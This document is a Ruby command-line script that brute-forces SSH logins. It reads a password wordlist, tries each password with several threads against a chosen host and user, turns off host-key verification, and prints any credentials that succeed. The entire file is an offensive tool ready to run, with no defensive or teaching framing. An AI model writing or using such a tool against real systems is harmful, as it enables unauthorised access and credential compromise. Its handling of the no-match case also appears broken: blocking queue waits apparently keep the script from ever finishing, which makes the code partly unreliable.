#!/usr/bin/env ruby

require 'net/ssh'
require 'optparse'
require 'thread'

options = {
  host: nil,
  port: 22,
  user: nil,
  wordlist: nil,
  threads: 4,
  timeout: 10
}

OptionParser.new do |opts|
  opts.banner = "Usage: ssh_brute_ruby.rb [options]"
  opts.on('-h', '--host HOST', 'Target host') { |v| options[:host] = v }
  opts.on('-p', '--port PORT', 'SSH port') { |v| options[:port] = v.to_i }
  opts.on('-u', '--user USER', 'Username') { |v| options[:user] = v }
  opts.on('-w', '--wordlist FILE', 'Password wordlist') { |v| options[:wordlist] = v }
  opts.on('-t', '--threads NUM', 'Number of threads') { |v| options[:threads] = v.to_i }
  opts.on('-T', '--timeout SEC', 'Connection timeout') { |v| options[:timeout] = v.to_i }
end.parse!

abort "Missing required arguments" unless options[:host] && options[:user] && options[:wordlist]

puts "Starting SSH brute force on #{options[:host]}:#{options[:port]}"
puts "Target: #{options[:user]}"
puts "Threads: #{options[:threads]}"
puts "Timeout: #{options[:timeout]} seconds"
puts "----------------------------------------"

# Load wordlist
passwords = File.readlines(options[:wordlist]).map(&:chomp)
puts "Loaded #{passwords.size} passwords"

# Create queue and result channel
password_queue = Queue.new
result_queue = Queue.new

# Add passwords to queue
passwords.each { |pwd| password_queue << pwd }

# Worker function
def try_ssh(host, port, user, password, timeout)
  begin
    Net::SSH.start(host, user, password: password, port: port, timeout: timeout, paranoid: false) do |ssh|
      return true
    end
  rescue
    return false
  end
end

# Create threads
threads = []
options[:threads].times do
  threads << Thread.new do
    while password = password_queue.pop
      if try_ssh(options[:host], options[:port], options[:user], password, options[:timeout])
        result_queue << "[SUCCESS] #{options[:user]}:#{password}"
        break
      end
    end
  end
end

# Wait for results
if result = result_queue.pop
  puts result
  threads.each(&:kill)
  exit 0
end

# Wait for all threads to finish
threads.each(&:join)
puts "No valid credentials found"
